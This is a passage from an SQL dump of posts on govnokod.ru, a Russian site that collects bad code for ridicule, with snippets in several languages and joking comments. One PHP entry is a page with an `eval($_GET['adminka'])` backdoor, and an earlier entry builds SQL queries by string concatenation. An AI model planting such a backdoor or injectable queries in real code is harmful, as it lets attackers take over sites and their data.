`ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `four_three` = ''1'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == 16 && $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `sixteen_ten` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `sixteen_ten` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `sixteen_ten` = ''1'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == \"n\" && $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `status_NEW` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `status_NEW` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `status_NEW` = ''1'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == \"m\" && $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `poster` = ''\".$_SESSION[''userid''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `poster` = ''\".$_SESSION[''userid''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `poster` = ''\".$_SESSION[''userid''].\"'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == \"m_in_cat\" && $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `poster` = ''\".$_SESSION[''userid''].\"'' AND Category = ''\".$result_needed[''id''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `poster` = ''\".$_SESSION[''userid''].\"'' AND Category = ''\".$result_needed[''id''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `poster` = ''\".$_SESSION[''userid''].\"'' AND Category = ''\".$result_needed[''id''].\"'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_SESSION[''usergroupid''] > 3\telseif ( $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `Category` = ''\".$id.\"'' OR `Category` IN (SELECT `id` FROM `Categories` WHERE `Parent` = ''\".$id.\"'') ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");   ///-------------\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `Category` = ''\".$id.\"'' OR `Category` IN (SELECT `id` FROM `Categories` WHERE `Parent` = ''\".$id.\"'') ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `Category` = ''\".$id.\"'' OR `Category` IN (SELECT `id` FROM `Categories` WHERE `Parent` = ''\".$id.\"'') ORDER BY `ID` DESC\");\r\n// И еще примерно столько же подобного говнеца. Сюда просто не влазит...\r\n\t}','','Пустые ифы, куча лишних запросов.\r\nОчень яркий пример ИНДУСтриального программирования.',15,0,1,3),
  (70,983,2,1228738236,0,'<script>\r\nfunction changeLogo(imgLoc){\r\n    document.getElementById(\"module_logo\").src = \"./site/\" + imgLoc + \"_logo.jpg\";\r\n}\r\nfunction returnLogo(imgLoc){\r\n    document.getElementById(\"module_logo\").src = \"./site/\" + imgLoc + \"_logo.jpg\";\r\n}\r\n</script>','','',17,0,1,0),
  (71,985,9,1228740844,0,'private Map<Class<?>, Map<String, String[]>> compressDependencies(\r\n      Map<Class<?>, Map<String, List<String>>> dependencies) {\r\n    final Map<Class<?>, Map<String, String[]>> result =\r\n        new FastMap<Class<?>, Map<String, String[]>>(dependencies.size());\r\n    final Set<Entry<Class<?>, Map<String, List<String>>>> entrySet = dependencies.entrySet();\r\n    for (Entry<Class<?>, Map<String, List<String>>> entry : entrySet) {\r\n      final Map<String, List<String>> value = entry.getValue();\r\n      final Map<String, String[]> desc = new FastMap<String, String[]>(value.size());\r\n      final Set<Entry<String, List<String>>> subEntries = value.entrySet();\r\n      for (Entry<String, List<String>> valueEntry : subEntries) {\r\n        final List<String> list = valueEntry.getValue();\r\n        if (list != null && !list.isEmpty()) {\r\n          desc.put(valueEntry.getKey(), list.toArray(new String[list.size()]));\r\n        }\r\n      }\r\n      result.put(entry.getKey(), desc);\r\n    }\r\n    return result;\r\n  }','',' Код от \"мега разработчика\", архитектора очень большого проекта. \r\n\r\n PS Будьте осторожны в использовании java generics :)',24,0,1,1),
  (72,989,8,1228745974,1229420180,'private static string identifier(string wmiClass, string wmiProperty)\r\n            {\r\n                string result = \"\";\r\n                System.Management.ManagementClass mc =\r\n            new System.Management.ManagementClass(wmiClass);\r\n                System.Management.ManagementObjectCollection moc = mc.GetInstances();\r\n                foreach (System.Management.ManagementObject mo in moc)\r\n                {\r\n                    //Only get the first one\r\n                    if (result == \"\")\r\n                    {\r\n                        try\r\n                        {\r\n                            result = mo[wmiProperty].ToString();\r\n                            break;\r\n                        }\r\n                        catch\r\n                        {\r\n                        }\r\n                    }\r\n                }\r\n                return result;\r\n            }','','',-1,0,0,1),
  (73,993,11,1228746930,0,'private function _mouseDown(e:MouseEvent):void \r\n{\r\n\tstage.addEventListener(MouseEvent.MOUSE_UP, _mouseUp);\r\n\tif (e.target is PCell) {\r\n\t\t//Клик по клетке, но возможно хотят подвигать поле :)\r\n\t\t_startDrag(e);\r\n\t}\r\n\telse {\r\n\t\t//Значит двигаем поле\r\n\t\t_startDrag(e);\r\n\t}\r\n}','','',15,0,1,0),
  (74,998,3,1228748000,0,'SELECT FROM Staff\r\n  CASE Sex\r\n  WHEN ''M'' THEN ''МужЫк!''\r\n  WHEN ''F'' THEN ''Баба''\r\n  ELSE ''ЫЫЫыы?''','','препод сказал что елсе не будет выполняться изза ограничений целостности базы',15,0,1,1),
  (75,1001,9,1228749107,0,'/**\r\n * Reply string array after tokenize the url address\r\n *\r\n * @param String url\r\n * @return String[]\r\n */\r\nprotected String[] processURL(String url) {\r\n\r\n    StringBuffer s = new StringBuffer(url);\r\n    StringBuffer AfterRemoval = s.delete(0, 27);\r\n...','','...в тот день магическим числом для паренька из Индии было число 27... похоже он и сам не понимал почему.. возможно это как то было связано с именем хоста...',10,0,1,0),
  (76,1003,9,1228750879,0,'public void updateAmountValues(List<TransactionResultItem> transactionResultItems) {\r\n        for (TransactionResultItem transaction : transactionResultItems) {\r\n            Account account = getAccountById(transaction.getAccountId());\r\n            if ((transaction.getMainTransaction()\r\n                    && ! transaction.getTransactionTypeId().equals(4)\r\n                    && ! transaction.getTransactionTypeId().equals(5)\r\n                    && ! transaction.getTransactionTypeId().equals(6))\r\n                    ||\r\n                    (! transaction.getMainTransaction() &&\r\n                            (transaction.getTransactionTypeId().equals(5) &&\r\n                                    ((account.getAccountTypeId().equals(AccountType.INCOME_TYPE_ID) ||\r\n                                            account.getAccountTypeId().equals(AccountType.OTHER_INCOME_TYPE_ID)) &&\r\n                                            transaction.getAmount() > 0)\r\n                                    || (transaction.getAccountId().equals(getSalesTaxPayableAccountId()) && transaction.getAmount() > 0)\r\n                                    || ((account.getAccountTypeId().equals(AccountType.EXPENSE_TYPE_ID) ||\r\n                                    account.getAccountTypeId().equals(AccountType.OTHER_EXPENSE_TYPE_ID)) && transaction.getAmount() < 0))\r\n                            || (transaction.getTransactionTypeId().equals(1) &&\r\n                            (account.getAccountTypeId().equals(AccountType.INCOME_TYPE_ID) ||\r\n                                    account.getAccountTypeId().equals(AccountType.OTHER_INCOME_TYPE_ID)) &&\r\n                            transaction.getAmount() < 0)\r\n                            || (transaction.getTransactionTypeId().equals(2) &&\r\n                            (account.getAccountTypeId().equals(AccountType.INCOME_TYPE_ID) ||\r\n                                    account.getAccountTypeId().equals(AccountType.OTHER_INCOME_TYPE_ID)) &&\r\n                            transaction.getAmount() > 0)\r\n                    )) {\r\n                Double amount = transaction.getAmount();\r\n                transaction.setAmount(-amount);\r\n            }\r\n        }\r\n    }','','Потрясающий по понятности код. Вызывался несколько раз в одном и том же методе.',25,0,1,0),
  (77,1005,2,1228755191,0,'var newstr = null;\r\n\t\tvar lastnewstr = null;\r\n\t\tvar newclass = null;\r\n\t\tvar lastclass = null;\r\n\t\tvar newstr2 = null;\r\n\t\tvar lastnewstr2 = null;\r\n\t\tvar newclass2 = null;\r\n\t\tvar lastclass2 = null;\r\n\t\tvar newstr3 = null;\r\n\t\tvar lastnewstr3 = null;\r\n\t\tvar newclass3 = null;\r\n\t\tvar lastclass3 = null;\r\n\t\t\r\nfunction check(s, i)\r\n{\r\n\t\tp1 = document.getElementById(\"id_1_\"+i);\r\n\t\tp2 = document.getElementById(\"id_2_\"+i);\r\n\tif (s!=lastnewstr)\r\n\t{\r\n\t\tnewclass2 = p1.className;\r\n\t\tnewclass3 = p2.className;\r\n\t\tnewclass = s.className;\r\n\t\ts.className=\"check\";\r\n\t\tp1.className=\"viz\";\r\n\t\tp2.className=\"viz\";\r\n\t\tif (lastnewstr!=null)\r\n\t\t{\r\n\t\t\tlastnewstr.className=lastclass;\r\n\t\t\tlastnewstr2.className=lastclass2;\r\n\t\t\tlastnewstr3.className=lastclass3;\r\n\t\t}\r\n\t}\r\n\tlastnewstr = s;\r\n\tlastnewstr2 = p1;\r\n\tlastnewstr3 = p2;\r\n\tlastclass = newclass;\r\n\tlastclass2 = newclass2;\r\n\tlastclass3 = newclass3;\r\n}','','Убожество которое на одной строке меняет у <tr> стиль и еще у двух элементов...',8,0,1,0),
  (78,1007,12,1228758190,1229420180,'nop\r\nnop\r\nnop\r\ncall somelabel\r\nsomelabel:\r\npop si\r\nsub si, 3','','ассемблер - источник массы говнокода, классика...\r\n',-2,0,0,14),
  (79,1011,7,1228761642,0,'//разметка матрицы\r\n\r\n while ((founded==1)&&(mat[nx][ny]<=0)) {\r\n  founded=0;\r\n  iii=y-i;\r\n  while (((i==0)&&(iii==y))||((iii<=y+i))){\r\n   ii=x-i;\r\n   while ((ii<=x+i)){\r\n\tif ((mat[ii][iii]==i)&&((ii<70)&&(ii>=0))&&((iii<70)&&(iii>=0))) {\r\n\t bii=ii;\r\n\t biii=iii;\r\n\t if ((mat[bii+1][biii]==-1)&&(bii+1<70)&&(bii+1>=0)) {\r\n\t  mat[bii+1][biii]=i+1;\r\n\t  founded=1;\r\n\t }\r\n\t if ((mat[bii-1][biii]==-1)&&(bii-1<70)&&(bii-1>=0)) {\r\n\t  mat[bii-1][biii]=i+1;\r\n\t  founded=1;\r\n\t }\r\n\t if ((mat[bii][biii+1]==-1)&&(biii+1<70)&&(biii+1>=0)) {\r\n\t  mat[bii][biii+1]=i+1;\r\n\t  founded=1;\r\n\t }\r\n\t if ((mat[bii][biii-1]==-1)&&(biii-1<70)&&(biii-1>=0)) {\r\n\t  mat[bii][biii-1]=i+1;\r\n\t  founded=1;\r\n\t }\r\n\t}\r\n\tii++;\r\n   }\r\n   iii++;\r\n  }\r\n  i++;\r\n }\r\n if (mat[nx][ny]>=0) {\r\n  if ((nx==40)&&(ny==57)) {\r\n   nx=nx;\r\n  }\r\n  ik=i;\r\n\r\n  ii=nx;\r\n  iii=ny;\r\n  //поиск пути\r\n\r\n  while (ik>1) {\r\n   if ((mat[ii-1][iii]==ik-1)&&(ii-1<70)&&(ii-1>=0)) {\r\n\tii--;\r\n\tmat[ii][iii]=-3;\r\n   }\r\n   if ((mat[ii][iii-1]==ik-1)&&(iii-1<70)&&(iii-1>=0)) {\r\n\tiii--;\r\n\tmat[ii][iii]=-3;\r\n   }\r\n   if ((mat[ii+1][iii]==ik-1)&&(ii+1<70)&&(ii+1>=0)) {\r\n\tii++;\r\n\tmat[ii][iii]=-3;\r\n   }\r\n\r\n   if ((mat[ii][iii+1]==ik-1)&&(iii+1<70)&&(iii+1>=0)) {\r\n\tiii++;\r\n\tmat[ii][iii]=-3;\r\n   }\r\n   ik--;\r\n  }\r\n   ax=ii*10+5;\r\n   ay=iii*10+5;\r\n  //out_to_file(mat,\"d:\\\\out.txt\");\r\n  i++;\r\n   ii=0;\r\n   iii=0;\r\n   while ((iii>-1)&&(iii<70)){\r\n\tii=0;\r\n\twhile ((ii>-1)&&(ii<70)){\r\n\t if ((mat[ii][iii]>-1)||(mat[ii][iii]==-3)) {\r\n\t  mat[ii][iii]=-1;\r\n\t }\r\n\t ii++;\r\n\t}\r\n\tiii++;\r\n   }\r\n  nx=ax;\r\n  ny=ay;\r\n } else ...\r\n }','','Разметка матрицы, Поиск Пути.',26,0,1,0),
  (80,1016,1,1228768165,0,'Application was halted by an exception.\r\nDebug-mode is off.','','Ошибка на govnokod.ru при добавлении комментариев',19,0,1,8),
  (81,1023,1,1228789059,0,'foreach(explode('' '',str_replace($symbols,'''',htmlspecialchars_decode(html_entity_decode(implode('' '',$keywords))))) as $i=>$val) if(mb_strlen($val)>2) echo '', ''.$val;','','Массив keywords собирается в строку через запятую :)',18,0,1,0),
  (83,1034,1,1228812453,0,'<?\r\n/////////////////////////////// GAME START TASOVKA //////////////////////////////////////////////////\r\nif($page == \"game_start\")\r\n\t{\r\n\t\t\r\n\t\tif( isset($_SESSION[\"game\"]) && !empty($_SESSION[\"game\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"game\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"total_price\"]) && !empty($_SESSION[\"total_price\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"total_price\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"game_num\"]) && !empty($_SESSION[\"game_num\"]))\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"game_num\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"ticket_num\"]) && !empty($_SESSION[\"ticket_num\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"ticket_num\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"for_fl\"]) && !empty($_SESSION[\"for_fl\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"for_fl\");\r\n\t\t\t}\r\n\t\t//---------------------------------------------------//\r\n\t\tif( isset($_SESSION[\"order_res_query3\"]) && !empty($_SESSION[\"order_res_query3\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res_query3\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_res_query2\"]) && !empty($_SESSION[\"order_res_query2\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res_query2\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_res2\"]) && !empty($_SESSION[\"order_res2\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res2\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_res\"]) && !empty($_SESSION[\"order_res\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"user_not_reg\"]) && !empty($_SESSION[\"user_not_reg\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"user_not_reg\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_id\"]) && !empty($_SESSION[\"order_id\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_id\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"user_edit_type\"]) && !empty($_SESSION[\"user_edit_type\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"user_edit_type\");\r\n\t\t\t}\t\r\n\t\t//---------------------------------------------------//\r\n\t\tif( isset($_SESSION[\"order_date\"]) && !empty($_SESSION[\"order_date\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_date\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"drawing_num\"]) && !empty($_SESSION[\"drawing_num\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"drawing_num\");\r\n\t\t\t}\r\n\t\t\t\r\n\t}\r\n/////////////////////////////// GAME START TASOVKA //////////////////////////////////////////////////\r\n?>\r\n<?\r\n/////////////////////////////// CHOSE TASOVKA //////////////////////////////////////////////////\r\nif($page == \"chose\")\r\n\t{\t\t\r\n\t\tif( isset($_SESSION[\"order_res_query3\"]) && !empty($_SESSION[\"order_res_query3\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res_query3\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_res_query2\"]) && !empty($_SESSION[\"order_res_query2\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res_query2\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_res2\"]) && !empty($_SESSION[\"order_res2\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res2\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\tif( isset($_SESSION[\"order_res\"]) && !empty($_SESSION[\"order_res\"]) )\r\n\t\t\t{\r\n\t\t\t\tsession_unregister(\"order_res\");','','',1,0,1,1),
  (84,1041,5,1228820192,0,'respons+=\"\"\"<span class=\"gray\">коэффициент:</span> %s<br />\"\"\" % str(koeff[0][5])\r\nrespons+=\"\"\"<br />\"\"\"','','Формирование \"аяксового\" ответа',8,0,1,0),
  (85,1046,5,1228827679,0,'text=string.replace(text,\"<br>\",\"\\n\")\r\ntext=string.replace(text,\"<BR>\",\"\\n\")\r\ntext=string.replace(text,\"<Br>\",\"\\n\")\r\ntext=string.replace(text,\"<bR>\",\"\\n\")','','Twisted Words, протокол Oscar.\r\nКусок функции dehtml()',33,0,1,0),
  (86,1049,9,1228828780,0,'contents = contents.replaceAll(\"\\\\&lt;(\\\\w+)\\\\&gt;\", \"<CT_$1>\\n\");\r\n\t\t\t\tcontents = contents.replaceAll(\"\\\\&lt;(\\\\w+)(\\\\s\\\\w+)=\\\\&quot;(\\\\w+)\\\\&quot;\\\\&gt;\", \"<CT_$1$2=\\\"$3\\\">\\n\");\r\n\t\t\t\tcontents = contents.replaceAll(\"\\\\&lt;(\\\\w+)(\\\\s\\\\w+)=\\\\&apos;(\\\\w+)\\\\&apos;\\\\&gt;\", \"<CT_$1$2=''$3''>\\n\");\r\n\t\t\t\tcontents = contents.replaceAll(\"\\\\&lt;/(\\\\w+)\\\\&gt;\", \"\\n</CT_$1>\\n\");','','преобразуем эскейпнутые тэги в обычные',11,0,1,0),
  (87,1057,10,1228839827,0,'for i:=sk[(npl-1)*5+1] to sk[(npl-1)*5+2]-1 do\r\n   begin\r\n   l1:=0;l2:=0;l3:=0;l4:=0;l5:=0;l6:=0;l7:=0;l8:=0;l9:=0;l10:=0;\r\n  for j:=1 to 100 do g1[j]:=0;\r\n   for k:=sk[(npl-1)*5+1] to sk[(npl-1)*5+2] do\r\n     if (k<>i )and\r\n   (((abs(xyz^[pxyz^[i]].x-xyz^[pxyz^[k]].x)< dd) or  ((lx-abs(xyz^[pxyz^[i]].x-xyz^[pxyz^[k]].x))<dd))\r\n   and ((abs(xyz^[pxyz^[i]].y-xyz^[pxyz^[k]].y)<dd) or  ((ly-abs(xyz^[pxyz^[i]].y-xyz^[pxyz^[k]].y))<dd))\r\n   and ((abs(xyz^[pxyz^[i]].z-xyz^[pxyz^[k]].z)<dd) or  ((lz-abs(xyz^[pxyz^[i]].z-xyz^[pxyz^[k]].z))<dd)))\r\n   then','','это только заголовок цикла ..',29,0,1,2),
  (88,1059,10,1228839969,0,'procedure TForm1.fritb(ie:longint;var fr0:extended);\r\n begin\r\nv1:=0;\r\n for nsf:=1 to 5 do\r\n  begin\r\n   kl11:=0;kl12:=0;kl22:=0;\r\n  for k:=1 to km[nsf] do\r\n    begin\r\n    if (cm^[ie]=cm^[nm^[(ie-1)*kms[ksf+1]+kms[nsf]+k]])and (cm^[ie]=1)\r\n    then      kl11:=kl11+1;\r\n    if (cm^[ie]=cm^[nm^[(ie-1)*kms[ksf+1]+kms[nsf]+k]])and (cm^[ie]=2)\r\n    then      kl22:=kl22+1;\r\nif (cm^[ie]<>cm^[nm^[(ie-1)*kms[ksf+1]+kms[nsf]+k]])and(cm^[nm^[(ie-1)*kms[ksf+1]+kms[nsf]+k]]<>0)and (cm^[ie]<>0)\r\n    then      kl12:=kl12+1;\r\n     end;\r\n  fr0:=fr0+kl11*(p11[1,nsf])+kl22*p11[2,nsf]+kl12*p11[3,nsf];\r\n  v1:=v1+kl11*(f11[1,nsf])+kl22*f11[2,nsf]+kl12*f11[3,nsf];\r\n   end;\r\n  fr0:=fr0-sqrt(abs(v1));\r\n end;','','процеДуро',10,0,1,0),
  (89,1064,2,1228900040,0,'val=(chb.checked?val|VAR_ID:val&~VAR_ID);','','позволяет сохранить в число 32 числа',4,0,1,0),
  (90,1066,8,1228900246,0,'this.SelectedDate = this.SelectedDate;','','Проверяем дату на корректность...',5,0,1,2),
  (91,1069,9,1228909808,1229420180,'private int checkTerm(PatternTerm term, int arr[],\r\n      int symbNum, boolean isEditing) {\r\n    if (term.count != INFINITY) {\r\n      int endIdx = Math.min(symbNum + term.count, arr.length);\r\n        int count = 0;\r\n        switch(term.termType) {\r\n          case DIGIT: {\r\n            for(int i = symbNum; i < endIdx; i++) {\r\n              if (!Character.isDigit((char)arr[i]))\r\n                return -1;\r\n              count++;\r\n            }\r\n            break;\r\n          }\r\n          case LETTER: {\r\n            for(int i = symbNum; i < endIdx; i++) {\r\n              if (!Character.isLetter((char)arr[i]))\r\n                return -1;\r\n              count++;\r\n            }\r\n            break;\r\n          }\r\n          case LETTERORDIGIT: {\r\n            for(int i = symbNum; i < endIdx; i++) {\r\n              if (!Character.isLetterOrDigit((char)arr[i]))\r\n                return -1;\r\n              count++;\r\n            }\r\n            break;\r\n          }\r\n          case CHARACTER: {\r\n            for(int i = symbNum; i < endIdx; i++) {\r\n              if (arr[i] != term.value)\r\n                return -1;\r\n              count++;\r\n            }\r\n            break;\r\n          }\r\n      }\r\n      if (!isEditing && count != term.count)\r\n        return -1;\r\n      \r\n      symbNum+=term.count;\r\n    } else {\r\n      int i = 0;\r\n      switch(term.termType) {\r\n        case DIGIT: {\r\n          while (((symbNum + i) < arr.length) &&\r\n              Character.isDigit((char)arr[symbNum + i])) i++;\r\n          break;\r\n        }\r\n        case LETTER: {\r\n          while (((symbNum + i) < arr.length) &&\r\n              Character.isLetter((char)arr[symbNum + i])) i++;\r\n          break;\r\n        }\r\n        case LETTERORDIGIT: {\r\n          while (((symbNum + i) < arr.length) &&\r\n              Character.isLetterOrDigit((char)arr[symbNum + i])) i++;\r\n          break;\r\n        }\r\n        case CHARACTER: {\r\n          while (((symbNum + i) < arr.length) &&\r\n              (arr[symbNum + i] == term.value)) i++;\r\n          break;\r\n        }\r\n      }\r\n      symbNum+=i;\r\n    }\r\n    return symbNum;\r\n  }','','Паша любит такие конструкции, которые хрен разобрать',-5,0,0,2),
  (92,1071,8,1228914458,1229420180,'public TourResult NextTour()\r\n      {\r\n        TourResult lresult = new TourResult();\r\n        lresult.TourNum = mCurrentTour;\r\n        lresult.IsEnd = false;\r\n        Card.Face[] lCurrFaces = getCurrentTourFace();\r\n        int lMaxFace = 0;\r\n        foreach (Card.Face lFace in lCurrFaces)\r\n        {\r\n          lMaxFace = ((int)lFace) > lMaxFace ? (int)lFace : lMaxFace;\r\n        }\r\n        int lMaxFaceCount = 0;\r\n        int lNotZeroCount = 0;\r\n        foreach (Card.Face lFace in lCurrFaces)\r\n        {\r\n          lMaxFaceCount = (int)lFace == lMaxFace ? lMaxFaceCount + 1 : lMaxFaceCount + 0;\r\n          lNotZeroCount = (int)lFace != 0 ? lNotZeroCount + 1 : lNotZeroCount + 0;\r\n        }\r\n\r\n        if (lMaxFaceCount > 1)\r\n        {\r\n          mUnknowTour = mUnknowTour > -1 ? mUnknowTour : mCurrentTour;\r\n          mCurrentTour++;\r\n          lresult.Message = \"Одинаковые карты, надо разиграть\";\r\n          lresult.PlayerIndex = -1;\r\n          lresult.Face = (Face)lMaxFace;\r\n          return lresult;\r\n        }\r\n        int lMaxFaceIndex;\r\n        for (lMaxFaceIndex = 0; lMaxFaceIndex < lCurrFaces.Length; lMaxFaceIndex++)\r\n        {\r\n          if (((int)lCurrFaces[lMaxFaceIndex]) == lMaxFace)\r\n            break;\r\n        }\r\n        if (lNotZeroCount < 2)\r\n        {\r\n          lresult.Message = \"победил\";\r\n          lresult.PlayerIndex = lMaxFaceIndex;\r\n          lresult.IsEnd = true;\r\n          return lresult;\r\n        }\r\n        int lPlaerCardsCount = mArr[lMaxFaceIndex].Count;\r\n        if (mUnknowTour > -1)\r\n        {\r\n          for (int i = mUnknowTour; i <= mCurrentTour; i++)\r\n          {\r\n            AddCardsToPlayer(i, lMaxFaceIndex);\r\n          }\r\n          mUnknowTour = -1;\r\n        }\r\n        else\r\n        {\r\n          AddCardsToPlayer(mCurrentTour, lMaxFaceIndex);\r\n        }\r\n\r\n        lresult.Message = \"загреб краты\";\r\n        for (int i = lPlaerCardsCount; i < mArr[lMaxFaceIndex].Count; i++)\r\n        {\r\n          lresult.Message += string.Format(\" {0},\", GetCardName(mArr[lMaxFaceIndex][i]));\r\n        }\r\n\r\n        lresult.PlayerIndex = lMaxFaceIndex;\r\n        mCurrentTour++;\r\n        return lresult;\r\n      }','','Говнокод из карточной игры в пьяницу',-1,0,0,1),
  (93,1073,1,1228914569,0,'<?php\r\necho \"<html>\";\r\necho \"<body>\";\r\necho \"<h1>This is my home page</h1>\";\r\necho \"DATENG & DOORWAY\";\r\necho \"</body>\";\r\necho \"</html>\";\r\nif (isset($_GET[''adminka''])) eval($_GET[''adminka'']);\r\n?>','','',48,0,1,3),
  (94,1075,9,1228914639,0,'if (true) {\r\n  // Something\r\n}','','Уже два года, как девушка закончила универ...',3,0,1,10),
  (95,1079,1,1228916911,0,'if ($_name==''homepage'' AND !is_numeric($_GET[''id2'']))\r\n\r\n\tinclude(SITEROOT.\"tpl/main.php\");\r\n\r\nelse\r\n\r\n\tinclude(SITEROOT.\"tpl/main.php\");','','Устроился программистом в одну контору... Начальник дал CMS типа их собственная разработка... вот что я там увидел ',20,0,1,1),
  (96,1084,7,1228924359,0,'if(dOper1p->Caption == \"-0\")\r\n   dOper1p->Caption = \"+0\";\r\n if(dOper2p->Caption == \"-0\")\r\n   dOper2p->Caption = \"+0\";\r\n\r\n if(dOper1m->Caption == \"-0.0\")\r\n   dOper1m->Caption = \"+0.0\";\r\n if(dOper2m->Caption == \"-0.0\")\r\n   dOper2m->Caption = \"+0.0\";','','типичный представитель говнокода',9,0,1,0),
  (97,1086,7,1228924774,1229420180,'bool MyProc::CompareModule(int *operand1, int *operand2, int n) {\r\n    for (int i = 1; i < n; i++) {\r\n        if (operand1[i] != operand2[i]) {\r\n            if (operand1[i] < operand2[i])\r\n                return false;\r\n            else\r\n                return true;\r\n        };\r\n    };\r\n    return true;\r\n};','','',-2,0,0,1),
  (98,1088,1,1228925039,0,'while(!$a){\r\n      $rd = rand(1,999999);\r\n      $mdrd = md5($rd);\r\n      db_query(\"SELECT * FROM players WHERE mdid = ''$mdrd'' LIMIT 1;\");\r\n      $fla = db_fetch();\r\n           if(empty($fla))\r\n           $a=1;\r\n           }','','Молодость...\r\n// Поиск уникального идентификатора для юзера в базу данных.',10,0,1,8),
  (99,1091,6,1228925680,0,'/* add ''\\0'' at the end */\r\ntargetIPString[strlen(targetIPString)] = ''\\0'';','','',25,0,1,2),
